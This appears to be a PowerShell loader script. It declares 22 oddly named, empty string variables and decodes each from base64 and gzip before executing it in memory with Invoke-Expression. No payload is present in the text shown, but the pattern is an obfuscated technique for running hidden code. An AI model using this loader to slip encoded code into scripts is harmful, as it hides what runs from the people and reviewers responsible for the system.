#Requires -Version 2

$Negativing = ""
$Despicable = ""
$Jubilation = ""
$Jubilantly = ""
$Crocodiles = ""
$Manhandles = ""
$Eustachian = ""
$Footballer = ""
$Hacktivist = ""
$Overacting = ""
$Overtaxing = ""
$Oregonians = ""
$Aggrieving = ""
$Contacting = ""
$Besmirched = ""
$Interrupts = ""
$Spotlights = ""
$Designated = ""
$Kickstands = ""
$Perfectest = ""
$Emissaries = ""
$Technology = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Negativing,$Despicable,$Jubilation,$Jubilantly,$Crocodiles,$Manhandles,$Eustachian,$Footballer,$Hacktivist,$Overacting,$Overtaxing,$Oregonians,$Aggrieving,$Contacting,$Besmirched,$Interrupts,$Spotlights,$Designated,$Kickstands,$Perfectest,$Emissaries,$Technology)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
